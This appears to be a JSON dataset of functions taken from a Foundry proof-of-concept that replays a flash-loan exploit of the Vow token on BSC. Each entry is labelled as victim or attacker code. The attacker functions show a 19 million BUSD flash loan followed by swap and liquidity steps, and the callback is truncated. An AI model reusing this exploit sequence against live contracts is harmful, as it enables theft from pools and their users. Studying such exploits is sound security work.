[
  {
    "contract/interface": "Imoney",
    "source_type": "victim_contract",
    "function_name": "Send",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "Imoney",
    "source_type": "victim_contract",
    "function_name": "stakes",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "getbalance",
    "original_code": "    function getbalance() public {\n        emit log_named_decimal_uint(\"this token balance\", Vow.balanceOf(address(this)), Vow.decimals());\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "getreserves",
    "original_code": "    function getreserves(\n        uint256 stepNum\n    ) public {\n        console.log(\"Step %i\", stepNum);\n        (uint256 reserveIn, uint256 reserveOut,) = Pair.getReserves();\n        emit log_named_decimal_uint(\"ReserveIn\", reserveIn, 1);\n        emit log_named_decimal_uint(\"ReserveOut\", reserveOut, 18);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "pancakeV3FlashCallback",
    "original_code": "    function pancakeV3FlashCallback(uint256 fee0, uint256 fee1, bytes calldata data) external {\n        //Step 1\n        //Tx:https://app.blocksec.com/explorer/0x8d27f9a15b1834e5f9e55d47ec32d01e7fe54f93cfc6ea9d4e8c5fbe72756897\n        swap_token_to_tokens(address(WBNB), address(BUSD), address(Vow), 2 ether);\n        swap_token_to_token(address(Vow), address(Vusd), 854_320_785_746_786_696_066);\n        Vusd.approve(address(Router), 2_000_000 ether);\n        Vow.approve(address(Router), 2_000_000 ether);\n        Router.addLiquidity(\n            address(Vow),\n            address(Vusd),\n            854_320_785_746_786_696_066,\n            1_182_464_186_867_710_570_390,\n            0,\n            0,\n            address(this),\n            block.timestamp + 500\n        );\n        address HelperExploitContract = create_contract(1);\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() external {\n        vm.createSelectFork(\"bsc\", 39_198_657);\n        deal(address(WBNB), address(this), 2 ether);\n        deal(address(BUSD), address(this), 0);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() external {\n        emit log_named_decimal_uint(\"[Begin] Attacker BUSD before exploit\", BUSD.balanceOf(address(this)), 18);\n\n        Pool.flash(address(this), 19_000_000 ether, 0, \"0x123\");\n\n        emit log_named_decimal_uint(\"[End] Attacker BUSD after exploit\", BUSD.balanceOf(address(this)), 18);\n        emit log_named_decimal_uint(\"[End] Attacker Vow after exploit\", Vow.balanceOf(address(this)), 18);\n    }\n\n",
    "description": ""
  }
]